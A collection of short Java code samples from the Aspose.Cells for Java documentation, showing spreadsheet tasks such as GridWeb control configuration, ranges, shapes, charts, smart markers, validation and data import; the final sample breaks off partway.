For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet of the Grid that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Adding a bit complex formula to ""A1"" cell
sheet.getCells().get(""A1"").setFormula(""=SUM(F1:F7)/ AVERAGE (E1:E7)-Sheet1!C6"");


 //Create a Workbook
 Workbook workbook = new Workbook(""range_autofill.xlsx"");
 //Get Cells
 Cells cells = workbook.getWorksheets().get(0).getCells();
 //Create Range
 Range src = cells.createRange(""C3:C4"");
 Range dest = cells.createRange(""C5:C10"");
 //AutoFill
 src.autoFill(dest, AutoFillType.SERIES);
 //Save the Workbook
 workbook.save(""range_autofill_result.xlsx"");
//Create a Workbook
 Workbook workbook = new Workbook();
 //Get Cells
 Cells cells = workbook.getWorksheets().get(0).getCells();
 //Create Range
 Range range = cells.createRange(""A1:C4"");
 
//Create a Workbook
 Workbook workbook = new Workbook(""current_region.xlsx"");
 //Get Cells
 Cells cells = workbook.getWorksheets().get(0).getCells();
 //Create Range
 Range src = cells.createRange(""A1:D7"");
 //Get CurrentRegion
 Range A1C3 = src.getCurrentRegion();
 //Create a Workbook
 Workbook workbook = new Workbook();
 //Get Cells
 Cells cells = workbook.getWorksheets().get(0).getCells();
 //Create Range
 Range range = cells.createRange(""A1:C4"");
 //Put value
 range.get(0, 0).putValue(""A1"");
 range.get(0, 1).putValue(""B1"");
 range.get(0, 2).putValue(""C1"");
 range.get(3, 0).putValue(""A4"");
 range.get(3, 1).putValue(""B4"");
 range.get(3, 2).putValue(""C4"");
 //Save the Workbook
 workbook.save(""RangeValueTest.xlsx"");
 
 //Create a Workbook
 Workbook workbook = new Workbook();
 //Get Cells
 Cells cells = workbook.getWorksheets().get(0).getCells();
 //Create Range
 Range range = cells.createRange(""A1:C4"");
 //Put value
 range.get(0, 0).putValue(""A1"");
 range.get(3, 2).putValue(""C4"");
 //Set Style
 Style style00 = workbook.createStyle();
 style00.setPattern(BackgroundType.SOLID);
 style00.setForegroundColor(Color.getRed());
 range.get(0, 0).setStyle(style00);
 Style style32 = workbook.createStyle();
 style32.setPattern(BackgroundType.HORIZONTAL_STRIPE);
 style32.setForegroundColor(Color.getGreen());
 style32.setBackgroundColor(Color.getRed());
 range.get(3, 2).setStyle(style32);
 //Save the Workbook
 workbook.save(""RangeStyleTest.xlsx"");
 
For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Setting the height of GridWeb control
gridweb.setHeight(Unit.Point(200));


//Setting the width of GridWeb control
gridweb.setWidth(Unit.Point(520));


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Setting the height of header bar
gridweb.setHeaderBarHeight(Unit.Point(35));


//Setting the width of header bar
gridweb.setHeaderBarWidth(Unit.Point(50));


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


int presetStyle = PresetStyle.COLORFUL_1;
gridweb.setPresetStyle(presetStyle);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


String customFilePath = ""http://localhost:8080/GDemo/xml/CustomStyle1.xml"";


int presetStyle = PresetStyle.CUSTOM;
gridweb.setCustomStyleFileName(customFilePath);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


CellEventHandler ce = new CellEventHandler() {
	public void handleCellEvent(Object sender, CellEventArgs e) {
		System.out.println(""Cell "" + e.getCell().getName() + "" is double-clicked."");
	}
};
gridweb.CellDoubleClick = ce;


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Event Handler for ColumnDoubleClick event
RowColumnEventHandler re = new RowColumnEventHandler() {


	public void handleCellEvent(Object sender, RowColumnEventArgs e) {
		System.out.println(""Column header:"" + (e.getNum() + 1) + "" is double-clicked."");
	}
};


gridweb.ColumnDoubleClick = re;


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Event Handler for RowDoubleClick event
RowColumnEventHandler re = new RowColumnEventHandler() {


	public void handleCellEvent(Object sender, RowColumnEventArgs e) {
		System.out.println(""Row header:"" + (e.getNum() + 1) + "" is double-clicked."");
	}
};


gridweb.RowDoubleClick = re;


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Enabling Double Click events
gridweb.setEnableDoubleClickEvent(true);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Enabling the Edit Mode of GridWeb
gridweb.setEditMode(true);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Enabling the View Mode of GridWeb
gridweb.setEditMode(false);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


CellEventHandler ce = new CellEventHandler() {
	public void handleCellEvent(Object sender, CellEventArgs e) {
		//Your event handler code goes here
		if (e.getArgument().toString().equals(""A1"")) {
			//Your rest of the code
		}
	}
};
gridweb.CellCommand = ce;


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Setting the background color of the header bars
gridweb.getHeaderBarStyle().setBackColor(Color.getBrown());


//Setting the foreground color of the header bars
gridweb.getHeaderBarStyle().setForeColor(Color.getYellow());


//Setting the font of the header bars to bold
gridweb.getHeaderBarStyle().getFont().setBold(true);


//Setting the font name to ""Century Gothic""
gridweb.getHeaderBarStyle().getFont().setName(""Century Gothic"");


//Setting the border width to 2 points
gridweb.getHeaderBarStyle().setBorderWidth(Unit.Point(2));


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Specifying the path of Excel file using importExcelFile method of the control
gridweb.importExcelFile(filePath);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Printing Grid web
gridweb.print();


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Saving Grid content to an Excel file
gridweb.saveToExcelFile(""/new.xlsx"");


// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Read icon resource file data
String fileName = ""icon.svg"";
FileInputStream fsSource = new FileInputStream(fileName);
byte[] bytes = fsSource.readAllBytes();
fsSource.close();


// Create workbook from sample file
Workbook workbook = new Workbook(""sample.xlsx"");


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the icon to the worksheet
sheet.getShapes().addIcons(3, 0, 7, 0, 100, 100, bytes, null);


//Set a prompt message
Cell c = sheet.getCells().get(8, 7);
c.putValue(""Insert via Aspose.Cells"");
Style s = c.getStyle();
s.getFont().setColor(Color.getBlue());
c.setStyle(s);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
 Workbook workbook = new Workbook();


 // Obtaining the reference of the first worksheet
 Worksheet worksheet = workbook.getWorksheets().get(0);


 // Adding sample values to cells
 worksheet.getCells().get(""A2"").putValue(""Category1"");
 worksheet.getCells().get(""A3"").putValue(""Category2"");
 worksheet.getCells().get(""A4"").putValue(""Category3"");


 worksheet.getCells().get(""B1"").putValue(""Column1"");
 worksheet.getCells().get(""B2"").putValue(4);
 worksheet.getCells().get(""B3"").putValue(20);
 worksheet.getCells().get(""B4"").putValue(50);
 worksheet.getCells().get(""C1"").putValue(""Column2"");
 worksheet.getCells().get(""C2"").putValue(50);
 worksheet.getCells().get(""C3"").putValue(100);
 worksheet.getCells().get(""C4"").putValue(150);
 // Adding a chart to the worksheet
 int chartIndex = worksheet.getCharts().add(ChartType.COLUMN, 5, 0, 15, 5);


 // Accessing the instance of the newly added chart
 Chart chart = worksheet.getCharts().get(chartIndex);


 // Setting chart data source as the range  ""A1:C4""
 chart.setChartDataRange(""A1:C4"", true);
 workbook.save( ""ColumnChart.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the callout quad arrow to the worksheet
sheet.getShapes().addAutoShape(AutoShapeType.QUAD_ARROW_CALLOUT, 2, 0, 2, 0, 100, 100);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the cube to the worksheet
sheet.getShapes().addAutoShape(AutoShapeType.CUBE, 2, 0, 2, 0, 100, 300);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the Five-pointed star to the worksheet
sheet.getShapes().addAutoShape(AutoShapeType.STAR_5, 2, 0, 2, 0, 100, 100);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the line to the worksheet
sheet.getShapes().addShape(MsoDrawingType.LINE, 2, 0, 2, 0, 100, 300);//method 1
//sheet.getShapes().addAutoShape(AutoShapeType.LINE, 2, 0, 2, 0, 100, 300);//method 2


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the line arrow to the worksheet
Shape s = sheet.getShapes().addShape(MsoDrawingType.LINE, 2, 0, 2, 0, 100, 300);//method 1
//Shape s = sheet.getShapes().addAutoShape(AutoShapeType.LINE, 2, 0, 2, 0, 100, 300);//method 2


//add a arrow at the line begin
s.getLine().setBeginArrowheadStyle(MsoArrowheadStyle.ARROW);//arrow type
s.getLine().setBeginArrowheadWidth(MsoArrowheadWidth.WIDE);//arrow width
s.getLine().setBeginArrowheadLength(MsoArrowheadLength.SHORT);//arrow length


//add a arrow at the line end
s.getLine().setEndArrowheadStyle(MsoArrowheadStyle.ARROW_OPEN);//arrow type
s.getLine().setEndArrowheadWidth(MsoArrowheadWidth.NARROW);//arrow width
s.getLine().setEndArrowheadLength(MsoArrowheadLength.LONG);//arrow length


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the multidocument to the worksheet
sheet.getShapes().addAutoShape(AutoShapeType.FLOW_CHART_MULTIDOCUMENT, 2, 0, 2, 0, 100, 100);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the multiplication sign to the worksheet
sheet.getShapes().addAutoShape(AutoShapeType.MATH_MULTIPLY, 2, 0, 2, 0, 100, 100);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the rectangle to the worksheet
ShapeCollection shapes = sheet.getShapes();
shapes.addShape(MsoDrawingType.RECTANGLE, 2, 0, 2, 0, 100, 300);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook from sample file
Workbook workbook = new Workbook();


// Access first worksheet from the collection
Worksheet sheet = workbook.getWorksheets().get(0);


// Add the thought bubble cloud to the worksheet
sheet.getShapes().addAutoShape(AutoShapeType.CLOUD_CALLOUT, 2, 0, 2, 0, 100, 100);


//Save.You can check your icon in this way.
workbook.save(""sample2.xlsx"", SaveFormat.XLSX);
public class Report
{
 private int year;
 private String date;
 private String assetClass;
 private int reportedCost;
 private int assessedValue;
 
 public Report(int year, String date, String assetClass, int reportedCost, int assessedValue)
	{
 this.year = year;
 this.date = date;
 this.assetClass = assetClass;
 this.reportedCost = reportedCost;
 this.assessedValue = assessedValue;
	}


 public int getYear()
	{
 return year;
	}


 public void setYear(int year)
	{
 this.year = year;
	}


 public String getDate()
	{
 return date;
	}


 public void setDate(String date)
	{
 this.date = date;
	}


 public String getAssetClass()
	{
 return assetClass;
	}


 public void setAssetClass(String assetClass)
	{
 this.assetClass = assetClass;
	}


 public int getReportedCost()
	{
 return reportedCost;
	}


 public void setReportedCost(int reportedCost)
	{
 this.reportedCost = reportedCost;
	}


 public int getAssessedValue()
	{
 return assessedValue;
	}


 public void setAssessedValue(int assessedValue)
	{
 this.assessedValue = assessedValue;
	}


 
}


List<Report> reportList = new ArrayList<>();
reportList.add(new Report(2010, ""13/9/2010"",  ""Fast Food Equipment"",  400,160));
reportList.add(new Report(2010, ""14/9/2010"", ""Fast Food Equipment"", 800,1280));
reportList.add(new Report(2009, ""13/9/2009"", ""Fast Food Equipment"", 300, 90));
reportList.add(new Report(2009, ""14/9/2009"", ""Fast Food Equipment"", 600, 720));
reportList.add(new Report(2009, ""15/9/2009"", ""Fast Food Equipment"", 900, 2430));
reportList.add(new Report(2010, ""13/9/2010"", ""Inventory"", 100, 10));
reportList.add(new Report(2010, ""14/9/2010"", ""Inventory"", 200, 80));
reportList.add(new Report(2010, ""15/9/2010"", ""Inventory"", 300, 270));
reportList.add(new Report(2009,  ""13/9/2009"", ""Inventory"", 200, 40));
reportList.add(new Report(2009, ""14/9/2009"", ""Inventory"", 400, 320));




// Instantiate the workbook from a template file that contains Smart Markers
Workbook book = new Workbook(""template.xlsx"");




// Instantiate a new WorkbookDesigner
WorkbookDesigner designer = new WorkbookDesigner();


// Specify the workbook to the designer book
designer.setWorkbook(book);


// Set the data source
designer.setDataSource(""Report"", reportList);


// Process the smart markers
designer.process();		


// Save the Excel file
book.save(""output_java.xlsx"", SaveFormat.XLSX);
public class CopyStyleData
{


 private int year;
 private String date;
 
 public CopyStyleData(int year, String date)
	{
 this.year = year;
 this.date = date;
	}


 public int getYear()
	{
 return year;
	}


 public void setYear(int year)
	{
 this.year = year;
	}


 public String getDate()
	{
 return date;
	}


 public void setDate(String date)
	{
 this.date = date;
	}
 
}






List<CopyStyleData> dataList = new ArrayList<>();
dataList.add(new CopyStyleData(2010, ""13/9/2010""));
dataList.add(new CopyStyleData(2010, ""14/9/2010""));
dataList.add(new CopyStyleData(2009, ""13/9/2009""));
dataList.add(new CopyStyleData(2009, ""14/9/2009""));
dataList.add(new CopyStyleData(2009, ""15/9/2009""));
dataList.add(new CopyStyleData(2010, ""13/9/2010""));
dataList.add(new CopyStyleData(2010, ""14/9/2010""));
dataList.add(new CopyStyleData(2010, ""15/9/2010""));
dataList.add(new CopyStyleData(2009,  ""13/9/2009""));
dataList.add(new CopyStyleData(2009, ""14/9/2009""));




// Instantiate the workbook from a template file that contains Smart Markers
Workbook book = new Workbook(""template1.xlsx"");




// Instantiate a new WorkbookDesigner
WorkbookDesigner designer = new WorkbookDesigner();


// Specify the workbook to the designer book
designer.setWorkbook(book);


// Set the data source
designer.setDataSource(""DataList"", dataList);


// Process the smart markers
designer.process(false);


// Save the Excel file
book.save(""output_java.xlsx"", SaveFormat.XLSX);	
For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet that is currently active
GridWorksheet worksheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Setting the header of 1st column to ""ID""
worksheet.SetColumnCaption(0, ""ID"");


//Setting the header of 2nd column to ""Name""
worksheet.SetColumnCaption(1, ""Name"");


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the worksheet that is currently active
GridWorksheet worksheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Setting the header of 1st row to ""ID""
worksheet.setRowCaption(1, ""ID"");


//Setting the header of 2nd row to ""Name""
worksheet.setRowCaption(2, ""Name"");


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the reference of the worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Deleting 2nd column from the worksheet
sheet.getCells().deleteColumn(1);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the reference of the worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Deleting 2nd row from the worksheet
sheet.getCells().deleteRow(1);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the reference of the worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Freezing 4th row and 3rd column
sheet.freezePanes(3, 2, 3, 2);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the reference of the worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Inserting a new column to the worksheet before column ""B""
sheet.getCells().insertColumn(1);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the reference of the worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Inserting a new row to the worksheet before 2nd row
sheet.getCells().insertRow(1);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the first worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Restricting column related operations in context menu
gridweb.setEnableClientColumnOperations(false);


//Restricting row related operations in context menu
gridweb.setEnableClientRowOperations(false);


//Restricting freeze option of context menu
gridweb.setEnableClientFreeze(false);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the cells collection of the worksheet that is currently active
GridCells cells = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex()).getCells();


//Setting the width of 1st column to 150 points
cells.setColumnWidth(0, 150);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the cells collection of the worksheet that is currently active
GridCells cells = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex()).getCells();


//Setting the height of 1st row to 50 points
cells.setRowHeight(0, 50);


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Accessing the reference of the worksheet that is currently active
GridWorksheet sheet = gridweb.getWorkSheets().get(gridweb.getActiveSheetIndex());


//Unfreezing rows and columns
sheet.unFreezePanes();


For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


WorkbookEventHandler we=new WorkbookEventHandler(){
	public void handleCellEvent(Object sender, CellEventArgs e){
		System.out.println(""----------Save Command----------"");
	}


};
CellEventHandler ceh=new CellEventHandler(){
	public void handleCellEvent(Object sender, CellEventArgs e){
		System.out.println(""---------Cell Double Click---------"");
	}


};
RowColumnEventHandler reh=new RowColumnEventHandler(){
	public void handleCellEvent(Object sender, RowColumnEventArgs e){
		System.out.println(""----------Row Double Click---------------"");
	}


};


RowColumnEventHandler cdbclick=new RowColumnEventHandler(){
	public void handleCellEvent(Object sender, RowColumnEventArgs e){
		System.out.println(""----------Column Double Click-------------"");
	}


};




gridweb.setEnableDoubleClickEvent(true);
gridweb.SaveCommand=we;
gridweb.CellDoubleClick=ceh;
gridweb.RowDoubleClick=reh;
gridweb.ColumnDoubleClick=cdbclick;


// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String sourceDir = Utils.Get_SourceDirectory();Workbook workbook = new Workbook(sourceDir + ""GetTextWidthSample.xlsx"");


System.out.println(""Text width: "" + CellsHelper.getTextWidth(workbook.getWorksheets().get(0).getCells().get(""A1"").getStringValue(), workbook.getDefaultStyle().getFont(), 1));
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String sourceDir = Utils.Get_SourceDirectory();


//Output directory
String outputDir = Utils.Get_OutputDirectory();


// Instantiating a Workbook object
Workbook workbook = new Workbook(sourceDir + ""SampleChangeTickLabelDirection.xlsx"");


Worksheet worksheet = workbook.getWorksheets().get(0);


// Load the chart from source worksheet
Chart chart = worksheet.getCharts().get(0);


chart.getCategoryAxis().getTickLabels().setDirectionType(ChartTextDirectionType.HORIZONTAL);


// Output the file
workbook.save(outputDir + ""outputChangeTickLabelDirection.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Instantiate a workbook
Workbook workbook = new Workbook();


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Set columns title 
worksheet.getCells().get(0, 0).setValue(""X"");
worksheet.getCells().get(0, 1).setValue(""Y"");


// Create random data and save in the cells
for (int i = 1; i < 21; i++)
{
 worksheet.getCells().get(i, 0).setValue(i);
 worksheet.getCells().get(i, 1).setValue(0.8);
}


for (int i = 21; i < 41; i++)
{
 worksheet.getCells().get(i, 0).setValue(i - 20);
 worksheet.getCells().get(i, 1).setValue(0.9);
}
// Add a chart to the worksheet
int idx = worksheet.getCharts().add(ChartType.LINE_WITH_DATA_MARKERS, 1, 3, 20, 20);


// Access the newly created chart
Chart chart = worksheet.getCharts().get(idx);


// Set chart style
chart.setStyle(3);


// Set autoscaling value to true
chart.setAutoScaling(true);


// Set foreground color white
chart.getPlotArea().getArea().setForegroundColor(Color.getWhite());


// Set Properties of chart title
chart.getTitle().setText(""Sample Chart"");


// Set chart type
chart.setType(ChartType.LINE_WITH_DATA_MARKERS);


// Set Properties of categoryaxis title
chart.getCategoryAxis().getTitle().setText(""Units"");


//Set Properties of nseries
int s2_idx = chart.getNSeries().add(""A2: A2"", true);
int s3_idx = chart.getNSeries().add(""A22: A22"", true);


// Set IsColorVaried to true for varied points color
chart.getNSeries().setColorVaried(true);


// Set properties of background area and series markers
chart.getNSeries().get(s2_idx).getArea().setFormatting(FormattingType.CUSTOM);
chart.getNSeries().get(s2_idx).getMarker().getArea().setForegroundColor(Color.getYellow());
chart.getNSeries().get(s2_idx).getMarker().getBorder().setVisible(false);


// Set X and Y values of series chart
chart.getNSeries().get(s2_idx).setXValues(""A2: A21"");
chart.getNSeries().get(s2_idx).setValues(""B2: B21"");


// Set properties of background area and series markers
chart.getNSeries().get(s3_idx).getArea().setFormatting(FormattingType.CUSTOM);
chart.getNSeries().get(s3_idx).getMarker().getArea().setForegroundColor(Color.getGreen());
chart.getNSeries().get(s3_idx).getMarker().getBorder().setVisible(false);


// Set X and Y values of series chart
chart.getNSeries().get(s3_idx).setXValues(""A22: A41"");
chart.getNSeries().get(s3_idx).setValues(""B22: B41"");


// Save the workbook
workbook.save(outDir + ""LineWithDataMarkerChart.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(GetChartSubTitleForODSFile.class) + ""Charts/"";


String filePath = dataDir + ""SampleChart.ods"";


Workbook workbook = new Workbook(filePath);


Worksheet worksheet = workbook.getWorksheets().get(0);


// Load the chart from source worksheet
Chart chart = worksheet.getCharts().get(0);


System.out.println(""Chart Subtitle: "" + chart.getSubTitle().getText());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// directories
String outputDir = Utils.Get_OutputDirectory();


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Adding a chart to the worksheet
int index = workbook.getWorksheets().add(SheetType.CHART);


Worksheet sheet = workbook.getWorksheets().get(index);
sheet.getCharts().addFloatingChart(ChartType.COLUMN, 0, 0, 1024, 960);
sheet.getCharts().get(0).getNSeries().add(""{1,2,3}"", false);


// Add checkbox to the chart.
sheet.getCharts().get(0).getShapes().addShapeInChart(MsoDrawingType.CHECK_BOX, PlacementType.MOVE, 400, 400, 1000, 600);
sheet.getCharts().get(0).getShapes().get(0).setText(""CheckBox 1"");


// Convert chart to image with additional settings
workbook.save(outputDir + ""InsertCheckboxInChartSheet_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
//Load the source Excel file 
Workbook wb = new Workbook(""sampleSeries_ValuesFormatCode.xlsx"");
 
//Access first worksheet
Worksheet worksheet = wb.getWorksheets().get(0);
 
//Access first chart
Chart ch = worksheet.getCharts().get(0);
 
//Add series using an array of values
ch.getNSeries().add(""{10000, 20000, 30000, 40000}"", true);
 
//Access the series and set its values format code
Series srs = ch.getNSeries().get(0);
srs.setValuesFormatCode(""$#,##0"");
 
//Save the output Excel file
wb.save(""outputSeries_ValuesFormatCode.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the directories.
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


Workbook workbook = new Workbook(sourceDir + ""ValidationsSample.xlsx"");


// Access first worksheet.
Worksheet worksheet = workbook.getWorksheets().get(0);


// Accessing the Validations collection of the worksheet
Validation validation = worksheet.getValidations().get(0);


// Create your cell area.
CellArea cellArea = CellArea.createCellArea(""D5"", ""E7"");


// Adding the cell area to Validation
validation.addArea(cellArea, false, false);


// Save the output workbook.
workbook.save(outputDir + ""ValidationsSample_out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load your source workbook
Workbook wb = new Workbook(srcDir + ""sampleAdvancedFilter.xlsx"");


// Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


// Apply advanced filter on range A5:D19 and criteria range is A1:D2
// Besides, we want to filter in place
// And, we want all filtered records not just unique records
ws.advancedFilter(true, ""A5:D19"", ""A1:D2"", """", false);


// Save the workbook in xlsx format
wb.save(outDir + ""outputAdvancedFilter.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
Workbook book = new Workbook(srcDir + ""sampleValidation.xlsx"");
Worksheet sheet = book.getWorksheets().get(""Sheet1"");
Cells cells  = sheet.getCells();
Cell a2 = cells.get(""A2"");
Validation va2 = a2.getValidation();
if(va2.getInCellDropDown()) {
 System.out.println(""A2 is a dropdown"");
} else {
 System.out.println(""A2 is NOT a dropdown"");
}
Cell b2 = cells.get(""B2"");
Validation vb2 = b2.getValidation();
if(vb2.getInCellDropDown()) {
 System.out.println(""B2 is a dropdown"");
} else {
 System.out.println(""B2 is NOT a dropdown"");
}
Cell c2 = cells.get(""C2"");
Validation vc2 = c2.getValidation();
if(vc2.getInCellDropDown()) {
 System.out.println(""C2 is a dropdown"");
} else {
 System.out.println(""C2 is NOT a dropdown"");
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ExportingDataFromWorksheets.class) + ""Data/"";


// Creating a file stream containing the Excel file to be opened
FileInputStream fstream = new FileInputStream(dataDir + ""book1.xls"");


// Instantiating a Workbook object
Workbook workbook = new Workbook(fstream);


// Accessing the first worksheet in the Excel file
Worksheet worksheet = workbook.getWorksheets().get(0);


// Exporting the contents of 7 rows and 2 columns starting from 1st cell
// to Array.
Object dataTable[][] = worksheet.getCells().exportArray(0, 0, 7, 2);


// Printing the number of rows exported
System.out.println(""No. Of Rows Exported: "" + dataTable.length);


// Closing the file stream to free all resources
fstream.close();
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Create Connection object - connect to Microsoft Access Students Database
java.sql.Connection conn = java.sql.DriverManager.getConnection(""jdbc:ucanaccess://"" + srcDir + ""Students.accdb"");


// Create SQL Statement with Connection object
java.sql.Statement st = conn.createStatement();


// Execute SQL Query and obtain ResultSet
java.sql.ResultSet rs = st.executeQuery(""SELECT * FROM Student"");


// Create workbook object
Workbook wb = new Workbook();


// Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


// Access cells collection
Cells cells = ws.getCells();


// Create import table options
ImportTableOptions options = new ImportTableOptions();


// Import Result Set at (row=2, column=2)
cells.importResultSet(rs, 2, 2, options);


// Execute SQL Query and obtain ResultSet again
rs = st.executeQuery(""SELECT * FROM Student"");


// Import Result Set at cell G10
cells.importResultSet(rs, ""G10"", options);


// Autofit columns
ws.autoFitColumns();


// Save the workbook
wb.save(outDir + ""outputImportResultSet.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ImportingFromJson.class) + ""Data/"";


// Instantiating a Workbook object
Workbook workbook = new Workbook();
Worksheet worksheet = workbook.getWorksheets().get(0);
 
// Read File
File file = new File(dataDir + ""Test.json"");
BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
String jsonInput = """";
String tempString;
while ((tempString = bufferedReader.readLine()) != null) {
 jsonInput = jsonInput + tempString; 
}
bufferedReader.close();
 
// Set Styles
CellsFactory factory = new CellsFactory();
Style style = factory.createStyle();
style.setHorizontalAlignment(TextAlignmentType.CENTER);
style.getFont().setColor(Color.getBlueViolet());
style.getFont().setBold(true);
 
